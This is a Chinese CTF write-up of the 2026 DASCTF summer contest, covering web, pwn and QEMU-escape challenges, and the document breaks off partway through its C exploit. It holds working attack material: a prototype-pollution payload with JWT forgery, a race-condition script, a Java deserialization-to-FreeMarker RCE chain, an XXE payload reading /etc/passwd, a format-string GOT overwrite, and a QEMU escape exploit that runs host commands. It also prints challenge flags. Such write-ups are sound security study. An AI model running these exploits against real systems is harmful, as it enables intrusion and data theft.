---
title: "2026DASCTF夏季赛"
date: 2026-06-01
lastmod: "2026-06-01T20:00:05+0800"
---
<!-- generated-by: obsidian_git_blog_pipeline -->

```
队伍名称：debuggers
```

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184250856.png)
# web
### CorpGate
```plain
一套全新的企业员工门户系统CorpGate
```

附件给了源码，审计一下  
能看到全是js文件，而且有一个文件叫merge.js，观察一下发现应该是原型链污染

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184956135.png)

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184945992.png)

然后找一下使用deepMerge方法的代码  
发现在`routes/user.js`里将用户可控的JSON放入`deepMerge(user.settings, req.body)`

```javascript
router.post('/api/settings', authMiddleware, (req, res) => {
  const user = Object.values(users).find(u => u.id === req.user.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (typeof req.body !== 'object' || req.body === null || Array.isArray(req.body)) {
    return res.status(400).json({ error: 'Invalid request body' });
  }
  deepMerge(user.settings, req.body);
  res.json({ success: true, message: 'Settings updated', settings: user.settings });
});
```

然后看下 `utils/merge.js` 怎么利用

```javascript
const BLOCKED_ROOTS = ['__proto__', '__defineGetter__', '__defineSetter__', 'constructor', 'prototype'];
const BLOCKED_KEYS = ['__proto__', '__defineGetter__', '__defineSetter__'];
const MAX_DEPTH = 6;

function isPlainObject(val) {
  return typeof val === 'object' && val !== null && !Array.isArray(val);
}

function sanitizeKey(key) {
  return key.replace(/\./g, '');
}

function deepMerge(target, source, depth) {
  if (depth === undefined) depth = 0;
  if (depth >= MAX_DEPTH) return target;
  for (var rawKey in source) {
    var key = sanitizeKey(rawKey);
    if (key === '') continue;
    if (BLOCKED_KEYS.indexOf(key) !== -1) continue;
    if (depth < 3 && BLOCKED_ROOTS.indexOf(key) !== -1) continue;
    if (isPlainObject(source[rawKey])) {
      if (typeof target[key] === 'object' && target[key] !== null) {
        deepMerge(target[key], source[rawKey], depth + 1);
      } else if (typeof target[key] === 'function') {
        deepMerge(target[key], source[rawKey], depth + 1);
      }
    } else {
      target[key] = source[rawKey];
    }
  }
  return target;
}
```

拦截了

+ `__proto__`
+ `constructor`
+ `prototype`

```javascript
if (depth < 3 && BLOCKED_ROOTS.indexOf(key) !== -1) continue;
```

但当`depth < 3` 的时候才拦截 `constructor` 和 `prototype`  
只要递归深度超过3即可绕过拦截

然后找用户默认配置结构，发现本身就是多层嵌套

```plain
settings: {
  theme: 'light',
  language: 'en',
  notifications: {
    email: true,
    desktop: true,
    digest: {
      frequency: 'daily',
      time: '09:00',
      channels: { slack: true, teams: false }
    }
  }
}
```

然后在config.js里找到利用点

```javascript
function configRefresh() {
  var rotation = {};
  rotation.source = 'vault';
  rotation.timestamp = Date.now();

  if (rotation.pending) {
    signingState.active = rotation.pending;
    signingState.version++;
    signingState.lastRotation = Date.now();
    return { rotated: true, version: signingState.version };
  }
  return { rotated: false, version: signingState.version };
}
```

这里的 `rotation` 是普通对象 `{}`  
在 JavaScript 里，访问 `rotation.pending` 时，如果对象自身没有这个属性，就会沿原型链向上找

那就通过原型链污染写入：

```javascript
Object.prototype.pending = 'corpgate-rotation-key'
```

会把当前 JWT 签名密钥改成我们指定的值

```javascript
signingState.active = rotation.pending;
```

最终利用链路如下

```plain
notifications -> digest -> channels -> constructor -> prototype -> pending
```

然后访问route/user.js的健康检查接口，完成密钥切换

```javascript
router.get('/api/system/healthcheck', (req, res) => {
  var result = config.configRefresh();
  res.json({
    status: 'healthy',
    timestamp: Date.now(),
    configVersion: result.version,
    rotated: result.rotated,
    services: {
      auth: 'jwt-cookie',
      signingKeyVersion: 'v' + result.version,
      configWatcher: 'rotation-based',
      reportEngine: 'available'
    }
  });
});
```

`routes/admin.js` 需要 `role === 'admin'` ，其中访问 `/admin` 时会生成一个一次性 reference

```javascript
router.get('/admin', authMiddleware, adminMiddleware, (req, res) => {
  var tokenId = crypto.randomBytes(16).toString('hex');
  var entry = Object.create(null);
  entry.owner = req.user.username;
  entry.created = Date.now();
  entry.ttl = 120000;
  entry.consumed = false;
  config.diagnosticStore[tokenId] = entry;
  ...
  res.render('admin', { user: req.user, stats: stats });
});
```

`stats.reference` 会被直接渲染到页面中。  
真正的 RCE/读 flag 点在 `routes/diagnostic.js`：

```javascript
router.post('/api/reports/execute', authMiddleware, adminMiddleware, (req, res) => {
  ...
  entry.consumed = true;

  var output = 'Diagnostic failed';
  try {
    output = execSync('/readflag').toString().trim();
  } catch (e) {}

  res.json({ status: 'completed', report: output });
});
```

#### 利用过程
1. 注册普通账户，拿cookie
2. POST访问/api/setting，触发原型链污染  
构造如下JSON

```javascript
{
  "notifications": {
    "digest": {
      "channels": {
        "constructor": {
          "prototype": {
            "pending": "corpgate-rotation-key"
          }
        }
      }
    }
  }
}
```

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184927064.png)

3. GET访问 `/api/system/healthcheck`切换密钥
4. jwt.io伪造管理员token，GET访问/admin拿reference

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184906055.png)

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184854472.png)

5. GET访问`/api/reports/execute`  
发送

```json
{
  "reference": "<刚拿到的 reference>"
}
```

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184843532.png)

### InkVerse
```plain
InkVerse是一个功能丰富的社区博客平台，支持文章发布、赞赏打赏、内容审核、文章导出以及每周摘要报告等功能。平台最近完成了一次大规模架构升级，引入了后台任务队列和分级公告系统。作为受邀的安全顾问，你的任务是对该系统进行全面评估。试试 /api/docs
```

无附件，那只能挨个访问接口看回显分析了  
`/api/docs`里是很多接口，最后整理出来相关接口如下

```plain
POST /api/tip
GET  /api/user/info
GET  /review
POST /api/review/single
POST /api/review/feature
GET  /api/review/feature/status
POST /api/export
GET  /api/export/status
GET  /exports/<filename>
GET  /bulletin
POST /api/bulletin/refresh
POST /article/new
POST /article/<id>/submit
```

注册普通账号后，`/api/user/info` 返回：

```json
{"balance":200,"id":2,"reputation":0,"role":"user","username":"user"}
```

面板里还会提示 reviewer 的门槛：

```latex
Reputation to Reviewer: 0 / 50
```

1. `/api/tip` 存在竞态条件  
打赏一篇已发布文章的正常效果是：
+ `balance -10`
+ `reputation +2`  
单线程最多只能打赏 20 次，因此最多只能到 `40 reputation`，理论上无法达到 reviewer 所需的 `50 reputation`

这说明如果能超过 50，大概率就是：

+ 余额检查和更新不是原子操作
+ 多个并发请求可以同时通过余额判断
+ 最终出现负余额，同时声望继续累加
2. 导出功能泄露 `Feature-Token`  
reviewer 可以导出已审核通过的文章：

```http
POST /api/export
Content-Type: application/json

{"article_id":4}
```

导出的文本文件中包含：

```latex
Feature-Token: fd18d52497c52ddef972f4a52eade8be8ba13a34e5552cbc3016a67c57580803
```

也就是说，导出功能把后续“文章加精”的敏感令牌直接泄露出来了

3. `/api/review/feature` 可重放该令牌  
拿到 `Feature-Token` 后，可以直接提交：

```http
POST /api/review/feature
Content-Type: application/json

{
  "article_id": 4,
  "signature": "fd18d52497c52ddef972f4a52eade8be8ba13a34e5552cbc3016a67c57580803"
}
```

接口返回

```json
{"message":"Feature request submitted for background processing"}
```

然后轮询

```http
GET /api/review/feature/status?article_id=4
```

最终会变成

```json
{"created_at":1780133890.0,"processed_at":1780133894.8714612,"status":"approved"}
```

这说明该 token 可以被 reviewer 拿来替普通作者完成 featured 流程

4. Bulletin 的分级访问控制是最终落点

作者成为 featured author 后，访问 `/bulletin` 会看到

```latex
Visibility levels: public, reviewer, featured_authors, admin
```

而 flag 就在 `featured_authors` 分级公告里

#### 利用过程
1. 注册普通用户并提交文章  
凭证为`racey2ch6eudri：Passw0rd!530A`

```http
POST /article/new
Content-Type: application/x-www-form-urlencoded

title=hello_1mo63y&content=body_uazlqg31
```

创建成功后，页面跳转到：

```latex
/article/4
```

因此本次文章 ID 为4  
然后提交审核

```http
POST /article/4/submit
```

返回页面中会出现

```latex
Article submitted for review
```

2. 并发竞态刷 reviewer  
并发请求核心是对同一个 session cookie 同时发很多次：

```http
POST /api/tip
Content-Type: application/json

{"article_id":1}
```

最小脚本形态如下：

```python
import concurrent.futures
import random
import requests
import string
import threading
import time

base = "http://1aa85824.http-ctf2.dasctf.com:80"
u = "race" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
p = "Passw0rd!530A"

s = requests.Session()
s.post(base + "/register", data={"username": u, "password": p}, allow_redirects=False)
s.post(base + "/login", data={"username": u, "password": p}, allow_redirects=False)
cookies = s.cookies.get_dict()

start = threading.Event()

def tip(_):
    start.wait()
    return requests.post(
        base + "/api/tip",
        json={"article_id": 1},
        cookies=cookies,
        timeout=20,
        allow_redirects=False,
    )

with concurrent.futures.ThreadPoolExecutor(max_workers=160) as ex:
    futures = [ex.submit(tip, i) for i in range(160)]
    time.sleep(0.5)
    start.set()
    results = [f.result() for f in futures]

print("success =", sum(r.status_code == 200 for r in results))
print(requests.get(base + "/api/user/info", cookies=cookies).text)
```

本次实例里的实际结果是：

```json
{"balance":-140,"id":3,"reputation":68,"role":"reviewer","username":"racey2ch6eudri"}
```

说明 reviewer 提权成功

3. reviewer 审核通过文章  
使用 reviewer 账号调用：

```http
POST /api/review/single
Content-Type: application/json

{"article_id":4,"action":"approve"}
```

响应为：

```json
{"message":"Article approved"}
```

4. 导出文章并拿到 `Feature-Token`  
创建导出任务：

```http
POST /api/export
Content-Type: application/json

{"article_id":4}
```

响应如下

```json
{"job_id":1,"message":"Export job queued"}
```

轮询导出状态

```http
GET /api/export/status
```

在返回值中找到下载路径

```json
{
  "jobs": [
    {
      "article_id": 4,
      "article_title": "hello_1mo63y",
      "created_at": 1780133716.0,
      "id": 1,
      "output_path": "export_1_4.txt",
      "status": "completed",
      "user_id": 3
    }
  ]
}
```

下载后查看文件内容

```http
GET /exports/export_1_4.txt
```

```latex
Title: hello_1mo63y
Author: authore6t3ffbsez
Export-ID: 1
Processed-At: 2026-05-30 09:35:29
Integrity: c8660ff9e71a9e408b19c8add02bffcd
Feature-Token: fd18d52497c52ddef972f4a52eade8be8ba13a34e5552cbc3016a67c57580803
---
body_uazlqg31
```

拿到token

```latex
Feature-Token: fd18d52497c52ddef972f4a52eade8be8ba13a34e5552cbc3016a67c57580803
```

5. 用导出泄露的 token 把作者变成 featured author

提交 feature 请求

```http
POST /api/review/feature
Content-Type: application/json

{
  "article_id": 4,
  "signature": "fd18d52497c52ddef972f4a52eade8be8ba13a34e5552cbc3016a67c57580803"
}
```

```json
{"message":"Feature request submitted for background processing"}
```

轮询状态

```http
GET /api/review/feature/status?article_id=4
```

本次利用中的关键响应：

```json
{"created_at":1780133890.0,"processed_at":null,"status":"pending"}
```

之后变成

```json
{"created_at":1780133890.0,"processed_at":1780133894.8714612,"status":"approved"}
```

此时文章作者已经成为 featured author

6. 刷新公告并读取 flag

切回普通作者账号，先刷新 bulletin 缓存：

```http
POST /api/bulletin/refresh
```

```json
{"message":"Bulletin cache invalidated"}
```

然后访问`GET /bulletin`  
返回结果如下

```latex
Featured Author Rewards
Congratulations! As a featured author, you have access to exclusive content and the weekly digest reports. Secret credential: DASCTF{cd58584b-04b9-4319-8f3d-434116ed0907}
```

成功拿到flag

### TaxManager
```plain
安全的税务系统
```

附件是jar文件，idea分析

在 `/api/export/generate` 中找到核心反序列化利用点

```java
Object obj = SerializeUtil.deserialize(voucherData);
```

而 `SerializeUtil.deserialize()` 本质就是：

```java
new ObjectInputStream(...).readObject()
```

没有任何白名单或过滤器，属于标准的 Java 反序列化

看下pop链该怎么构造

1. 反序列化 `ScheduledTaskHandler`
2. `ScheduledTaskHandler.readObject()` 会遍历 `taskQueue`
3. 队列里的 `Runnable` 会被直接 `run()`
4. 可以塞一个 `ReportJob`
5. `ReportJob.run()` 调用 `PdfReportGenerator.render()`
6. `PdfReportGenerator.render()` 用 `FreeMarker` 解析我们可控的模板
7. 借 `freemarker.template.utility.Execute` 触发命令执行

```plain
ObjectInputStream.readObject
-> ScheduledTaskHandler.readObject
-> ReportJob.run
-> PdfReportGenerator.render
-> FreeMarker Execute
-> RCE
```

同时发现`/api/import/history` 使用 `DocumentBuilderFactory.newInstance()` 解析 XML，但没有关闭外部实体。

因此存在经典 XXE：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <taxpayerId>&xxe;</taxpayerId>

</root>

```

`/api/profile/update` 支持用户传入任意键值对，并通过反射写回 `User` 对象字段。

虽然代码试图阻止把 `role` 改成 `admin`，但它只拦了：

```java
if ("role".equals(key) && "admin".equals(value)) {
    continue;
}
```

`/api/review` 在传入 `attachmentData` 时，会校验 `X-Signature`：

```java
HmacSHA256(secretKey, attachmentData)
```

`application.properties` 里可以直接看到一段硬编码密钥：

```properties
api.signing.secret=TaxManager_Secret_K3y_2026_Un1que
```

因此能直接计算签名

最终利用思路如下

```plain
1. 注册普通用户
2. 登录
3. 调 /api/profile/update 把自己改成 reviewer
4. 提交一条退税申请
5. 构造恶意 ScheduledTaskHandler 序列化对象
6. 用硬编码密钥计算 X-Signature
7. 调 /api/review 审批退款，并把恶意对象作为 attachmentData
8. 调 /api/export/prepare
9. 调 /api/export/generate，触发反序列化和模板执行
10. 通过 XXE 读取命令执行落到磁盘上的结果
```

#### 利用过程
1. 角色提升

```http
POST /api/profile/update
Content-Type: application/json

{"role":"reviewer"}
```

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184751766.png)

修改后再访问 `/api/profile`，可以看到当前角色已经变为 `reviewer`

![](assets/2026dasctf%E5%A4%8F%E5%AD%A3%E8%B5%9B-20260601184721353.png)

2. 构造反序列化对象  
恶意对象结构是：
+ `ScheduledTaskHandler`
    - `taskQueue`
        * `ReportJob`
            + `PdfReportGenerator`
            + 恶意 `FreeMarker` 模板

模板核心如下：

```plain
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("dd if=/flag.txt of=/tmp/b0 bs=1 count=1 skip=0")}
```

3. 触发RCE  
审批时把恶意序列化对象塞进 `attachmentData`，并带上合法签名。

之后调用：

+ `POST /api/export/prepare`
+ `POST /api/export/generate`

接口最终显示

```latex
Unexpected object type: com.tax.util.ScheduledTaskHandler. Expected: com.tax.model.TaxReport
```

但不影响利用

4. 读取flag  
确认 `/flag.txt` 存在后，逐字节执行：

```latex
dd if=/flag.txt of=/tmp/d0 bs=1 count=1 skip=0
dd if=/flag.txt of=/tmp/d1 bs=1 count=1 skip=1
dd if=/flag.txt of=/tmp/d2 bs=1 count=1 skip=2
...
```

然后通过 XXE 读取 `/tmp/dN`

# pwn
## 1.FmtNote
+ 64 位
+ 非 PIE
+ Canary 开启
+ NX 开启
+ Partial RELRO

因为是非 PIE，所以 GOT 地址固定；因为只是 Partial RELRO，所以 GOT 可写；因为题目会循环读输入，所以最自然的做法就是：

```plain
先 leak printf@got 算 libc
-> 再把 printf@got 改成 system
-> 下一轮发命令
```

本题关键点：

+ `printf@got = 0x404028`
+ `fmt offset = 6`
+ `libc printf = 0x606f0`
+ `libc system = 0x50d70`

先用 `%p` 探一下参数位置：

```plain
from pwn import *
import ssl

host = "7a71e3e9.tcp-ctf2.dasctf.com"
io = remote(host, 9999, ssl=True, sni=host, ssl_context=ssl._create_unverified_context())
io.recvuntil(b">>> ")
io.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p")
print(io.recvrepeat(1).decode("latin1", errors="replace"))
```

远程回显里第 6 个参数开始已经能看到输入本身：

0x7ffffacada80.0x5f.0x7f7a7af5c862.0x4.0x7f7a7b079040.0x70252e70252e7025...

所以格式串偏移就是 `6`。

泄露直接读 `printf@got`：

payload = b"%7$sENDX" + p64(0x404028)

这里虽然总偏移是 `6`，但后面拼上的 `p64(printf_got)` 落在下一组 8 字节槽位里，所以实际取值要用 `%7$s`。

远程实测拿到：

```plain
printf = 0x7f97ea7136f0
libc_base = 0x7f97ea6b3000
system = 0x7f97ea703d70
```

计算就是：

```plain
libc_base = printf_addr - 0x606f0
system_addr = libc_base + 0x50d70
```

目标是把：

printf@got -> system

64 位下这里写 3 段 `%hn` 就够了：

+ `0x404028` 写低 2 字节
+ `0x40402a` 写中间 2 字节
+ `0x40402c` 写高 2 字节

也就是：

```plain
items = [
    (0x404028, system_addr & 0xffff),
    (0x40402a, (system_addr >> 16) & 0xffff),
    (0x40402c, (system_addr >> 32) & 0xffff),
]
```

本题单次输入长度比较紧，实测 payload 要控制在 `0x5f` 以内，所以这里我最后用的是手搓 `%hn`
## 2.tick tock
```bash
timeout 120 ./qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio.gz \
    -append "console=ttyS0 root=/dev/ram rdinit=/init" \
    -monitor /dev/null \
    -device tick-tock-dma \
    -L ./pc-bios \
    -net none \
    -no-reboot
```

把 `rootfs.cpio.gz` 解开看 `init`，能看到 guest 启动后会直接给 root shell：

```shell
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev

echo "Tick Tock - QEMU Escape Challenge"
setsid /bin/cttyhack /bin/sh
```

所以远程本质不是一个普通菜单题，而是：

```latex
TLS socket
-> QEMU 串口
-> BusyBox root shell
```

核心漏洞在自定义设备 `tick-tock-dma` 的异步 DMA 定时器逻辑。

启动 timer 时，`dispatch_cmd(3)` 会先检查：

```c
dst + len <= 0x200
```

但是等到 `tt_timer_cb()` 真正触发时，它重新读取当前 channel 的 `dma_dst / dma_len / dma_dir`，却没有重新做边界检查。这样就形成了一个很典型的 TOCTOU：

```latex
检查时是合法范围
-> arm timer
-> timer 触发前改掉 dma_dst / dma_len
-> 回调里按新值 DMA
-> 越界读写
```

题目里最关键的是 channel1 后面的内存布局。`tick_tock_exp.c` 里已经把偏移算好了：

```c
#define CH1_BUF_OFF          0xe98ULL
#define COOKIE_FROM_CH1_BUF  (0x1098ULL - CH1_BUF_OFF)   /* 0x200 */
#define TIMER_CB_FROM_CH1BUF (0x10b0ULL - CH1_BUF_OFF)   /* 0x218 */
```

也就是：

```latex
ch1.buf + 0x200 -> dma_cookie
ch1.buf + 0x218 -> QEMUTimer.cb
ch1.buf + 0x220 -> QEMUTimer.opaque
```

而 `ch1.buf` 自身只有 `0x200` 字节，所以只要利用异步 DMA 的 TOCTOU 改掉 `dst/len`，就能越界到 timer 结构体。

思路可以分成四步。

第一步，先把要在 host 上执行的命令写进 `ch1.buf`。默认命令就是：

```shell
cat /flag 2>/dev/null; cat flag 2>/dev/null
```

第二步，用一次异步 DMA 越界读，把 `QEMUTimer.cb` 和 `QEMUTimer.opaque` 泄露出来。`cb` 实际上就是 `tt_timer_cb` 的代码地址，所以能算出 QEMU PIE 基址。

第三步，根据固定偏移算出 `system@plt`，然后再做一次异步 DMA 越界写：

```latex
QEMUTimer.cb     = system@plt
QEMUTimer.opaque = &ch1.buf[0]
```

第四步，重新 arm timer。这样 timer 到期时，QEMU host 原本会执行：

```c
tt_timer_cb(state)
```

现在就会变成：

```c
system(ch1.buf)
```

于是 host 直接执行我们提前写进 buffer 的命令，并把结果回显到串口。

现成 exp 里这两个偏移最重要：

```c
#define OFF_TT_TIMER_CB  0x3f8220ULL
#define OFF_SYSTEM_PLT   0x315730ULL
```

实际计算方式：

```c
uint64_t qemu_base  = timer_cb - OFF_TT_TIMER_CB;
uint64_t system_plt = qemu_base + OFF_SYSTEM_PLT;
uint64_t cmd_ptr    = state + CH1_BUF_OFF;
```

这里要注意，这组偏移是针对题目给的 `qemu-system-x86_64` 这一份二进制的，不是通用值。

另外，exp 需要把 guest 虚拟地址转物理地址，所以会读：

```latex
/proc/self/pagemap
```

这也是为什么 guest 里给 root shell 很关键。非 root 下 PFN 通常拿不到。

这题我本地不是在 Windows 直接跑 ELF，而是通过 SSH Linux 原生跑附件 QEMU。先确认 guest 的确会起到 `~ #`：

```latex
Tick Tock - QEMU Escape Challenge
Flag is on the HOST, not in the VM!
~ #
```

然后为了验证链条，我在宿主 QEMU 当前目录放了一个假的 `flag` 文件，内容是：

```latex
LOCAL_DUMMY_FLAG{tick_tock_ok}
```

接着通过串口把 `tick_tock_exp` 传进 guest。因为 guest 里有 `base64/gzip`，最稳的是：

```shell
cat <<'EOF' | base64 -d | gzip -d > /tmp/tick_tock_exp
...base64(gzip(binary))...
EOF
chmod +x /tmp/tick_tock_exp
/tmp/tick_tock_exp 'echo HOSTMARK; cat flag 2>/dev/null'
```

本地验证输出如下，说明已经成功执行到 host 命令：

```latex
[+] device: /sys/bus/pci/devices/0000:00:03.0, version=0x20260313
[+] dma page virt=0x717000 phys=0x00000000027b1000
[+] staged host command: echo HOSTMARK; cat flag 2>/dev/null
[+] leak cookie=0x4b434f544b434954 timer_cb=0x00005c21c5f4e220 state=0x00005c22005e5dc0
[+] qemu_base =0x00005c21c5b56000
[+] system@plt=0x00005c21c5e6b730
[+] cmd_ptr   =0x00005c22005e6c58
[+] overwritten timer callback, arming final timer...
HOSTMARK
LOCAL_DUMMY_FLAG{tick_tock_ok}
```

这一步说明 payload 本身没有问题，host 执行链已经打通。

远程不是直接给文件上传接口，而是同样给一个 QEMU 串口 shell，所以打法和本地一致：

1. 连接 `ssl=True` 的远程服务
2. 等待出现 `~ #`
3. 通过串口上传 `tick_tock_exp`
4. `chmod +x`
5. 执行 `/tmp/tick_tock_exp 'cat /flag 2>/dev/null; cat flag 2>/dev/null'`

远程实测输出：

```latex
[+] device: /sys/bus/pci/devices/0000:00:03.0, version=0x20260313
[+] dma page virt=0x646000 phys=0x00000000027ac000
[+] staged host command: cat /flag 2>/dev/null; cat flag 2>/dev/null
[+] leak cookie=0x4b434f544b434954 timer_cb=0x0000560c5f840220 state=0x0000560c9a60f960
[+] qemu_base =0x0000560c5f448000
[+] system@plt=0x0000560c5f75d730
[+] cmd_ptr   =0x0000560c9a6107f8
[+] overwritten timer callback, arming final timer...
DASCTF{t1ck_t0ck_qemu_3sc4pe_2026}
```

exp如下

```c
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define PAGE 0x1000ULL

#define REG_CMD        0x00
#define REG_STATUS     0x04
#define REG_CHANNEL    0x08
#define REG_SRC_LO     0x10
#define REG_SRC_HI     0x14
#define REG_DST        0x18
#define REG_LEN        0x1c
#define REG_ARM        0x20
#define REG_DELAY      0x24
#define REG_KEY        0x28
#define REG_ENC_MODE   0x2c
#define REG_DIR        0x30
#define REG_VERSION    0x3c

#define CMD_DMA        1
#define CMD_RESET      6

#define DIR_GUEST_TO_DEV 0
#define DIR_DEV_TO_GUEST 1

#define CH1_BUF_OFF          0xe98ULL
#define COOKIE_FROM_CH1_BUF  (0x1098ULL - CH1_BUF_OFF)   /* 0x200 */
#define TIMER_CB_FROM_CH1BUF (0x10b0ULL - CH1_BUF_OFF)   /* 0x218 */

#define OFF_TT_TIMER_CB  0x3f8220ULL
#define OFF_SYSTEM_PLT   0x315730ULL

static volatile uint8_t *mmio;

static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static uint32_t rd32(uint32_t off) {
    return *(volatile uint32_t *)(mmio + off);
}

static void wr32(uint32_t off, uint32_t val) {
    *(volatile uint32_t *)(mmio + off) = val;
}

static void select_ch(uint32_t ch) {
    wr32(REG_CHANNEL, ch);
}

static void set_src(uint64_t phys) {
    wr32(REG_SRC_LO, (uint32_t)phys);
    wr32(REG_SRC_HI, (uint32_t)(phys >> 32));
}

static void set_dma(uint64_t phys, uint32_t dst, uint32_t len, uint32_t dir) {
    set_src(phys);
    wr32(REG_DST, dst);
    wr32(REG_LEN, len);
    wr32(REG_DIR, dir);
}

static uint64_t virt2phys(void *p) {
    uint64_t virt = (uint64_t)p;
    uint64_t value = 0;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) die("open /proc/self/pagemap");

    off_t off = (virt / PAGE) * 8;
    if (pread(fd, &value, 8, off) != 8) die("pread pagemap");
    close(fd);

    if (!(value & (1ULL << 63))) {
        fprintf(stderr, "[-] page is not present\n");
        exit(1);
    }

    uint64_t pfn = value & ((1ULL << 55) - 1);
    if (pfn == 0) {
        fprintf(stderr, "[-] pagemap PFN is hidden; run as root/CAP_SYS_ADMIN in the VM\n");
        exit(1);
    }
    return pfn * PAGE + (virt & (PAGE - 1));
}

static int read_hex_u32(const char *path, uint32_t *out) {
    char buf[64];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;

    buf[n] = 0;
    *out = (uint32_t)strtoul(buf, NULL, 0);
    return 0;
}

static int map_resource0_sysfs(const char *devpath) {
    char res0[512];
    snprintf(res0, sizeof(res0), "%s/resource0", devpath);

    int fd = open(res0, O_RDWR | O_SYNC);
    if (fd < 0) return -1;

    mmio = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    close(fd);

    return mmio == MAP_FAILED ? -1 : 0;
}

static int map_resource0_devmem(const char *devpath) {
    char resource[512], line[256];
    snprintf(resource, sizeof(resource), "%s/resource", devpath);

    FILE *fp = fopen(resource, "r");
    if (!fp) return -1;
    if (!fgets(line, sizeof(line), fp)) {
        fclose(fp);
        return -1;
    }
    fclose(fp);

    unsigned long long start = 0, end = 0, flags = 0;
    if (sscanf(line, "%llx %llx %llx", &start, &end, &flags) != 3 || start == 0) {
        return -1;
    }

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) return -1;

    mmio = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (off_t)start);
    close(fd);

    return mmio == MAP_FAILED ? -1 : 0;
}

static void map_device(void) {
    DIR *dir = opendir("/sys/bus/pci/devices");
    if (!dir) die("opendir /sys/bus/pci/devices");

    struct dirent *de;
    char chosen[512] = {0};

    while ((de = readdir(dir)) != NULL) {
        if (de->d_name[0] == '.') continue;

        char devpath[512], vendor_path[512], device_path[512];
        snprintf(devpath, sizeof(devpath), "/sys/bus/pci/devices/%s", de->d_name);
        snprintf(vendor_path, sizeof(vendor_path), "%s/vendor", devpath);
        snprintf(device_path, sizeof(device_path), "%s/device", devpath);

        uint32_t vendor = 0, device = 0;
        if (read_hex_u32(vendor_path, &vendor) == 0 &&
            read_hex_u32(device_path, &device) == 0 &&
            vendor == 0x1337 && device == 0xcafe) {
            strncpy(chosen, devpath, sizeof(chosen) - 1);
            break;
        }
    }

    closedir(dir);

    if (!chosen[0]) {
        fprintf(stderr, "[-] tick-tock PCI device not found\n");
        exit(1);
    }

    if (map_resource0_sysfs(chosen) < 0 && map_resource0_devmem(chosen) < 0) {
        die("mmap MMIO BAR0");
    }

    fprintf(stderr, "[+] device: %s, version=0x%08x\n", chosen, rd32(REG_VERSION));
}

static void reset_ch(uint32_t ch) {
    select_ch(ch);
    wr32(REG_CMD, CMD_RESET);
}

static void immediate_dma(uint32_t ch, uint64_t phys, uint32_t dst, uint32_t len, uint32_t dir) {
    select_ch(ch);
    set_dma(phys, dst, len, dir);
    wr32(REG_CMD, CMD_DMA);

    for (int i = 0; i < 1000000; i++) {
        if (rd32(REG_STATUS) == 0) return;
    }
}

static void async_dma_oob(uint32_t ch, uint64_t phys, uint32_t oob_dst, uint32_t len, uint32_t dir) {
    select_ch(ch);

    /* First arm the timer with legal values, passing dispatch_cmd(3)'s bounds check. */
    set_dma(phys, 0, 1, dir);
    wr32(REG_DELAY, 10);     /* 10 ms virtual clock: enough time to win the race */
    wr32(REG_ARM, 1);        /* write-to-ARM calls dispatch_cmd(3) */

    /*
     * TOCTOU: before tt_timer_cb fires, replace the checked values.
     * tt_timer_cb uses current channel->dma_dst/dma_len and does not re-check dst+len.
     */
    set_dma(phys, oob_dst, len, dir);

    for (int i = 0; i < 20000000; i++) {
        if (rd32(REG_ARM) == 0) return;
    }

    fprintf(stderr, "[-] async timer did not finish; continuing anyway\n");
}

int main(int argc, char **argv) {
    const char *host_cmd = "cat /flag 2>/dev/null; cat flag 2>/dev/null";
    if (argc > 1) host_cmd = argv[1];

    map_device();

    void *page = NULL;
    if (posix_memalign(&page, PAGE, PAGE) != 0) die("posix_memalign");
    memset(page, 0, PAGE);
    ((volatile char *)page)[0] = 0x41;   /* fault page in */

    uint64_t phys = virt2phys(page);
    fprintf(stderr, "[+] dma page virt=%p phys=0x%016" PRIx64 "\n", page, phys);

    reset_ch(1);

    /* Put the host command in ch1.buf; later timer->opaque will point to it. */
    size_t cmd_len = strlen(host_cmd) + 1;
    if (cmd_len > 0x180) {
        fprintf(stderr, "[-] command too long\n");
        return 1;
    }

    memset(page, 0, PAGE);
    memcpy(page, host_cmd, cmd_len);
    immediate_dma(1, phys, 0, (uint32_t)cmd_len, DIR_GUEST_TO_DEV);
    fprintf(stderr, "[+] staged host command: %s\n", host_cmd);

    /*
     * Leak from ch1.buf+0x200 == state+0x1098:
     *   +0x00 dma_cookie "TICKTOCK"
     *   +0x18 QEMUTimer.cb     -> tt_timer_cb, gives QEMU PIE base
     *   +0x20 QEMUTimer.opaque -> TickTockState*, gives command pointer
     */
    memset(page, 0, PAGE);
    async_dma_oob(1, phys, COOKIE_FROM_CH1_BUF, 0x80, DIR_DEV_TO_GUEST);

    uint64_t *q = (uint64_t *)page;
    uint64_t cookie   = q[0];
    uint64_t timer_cb = q[3];
    uint64_t state    = q[4];

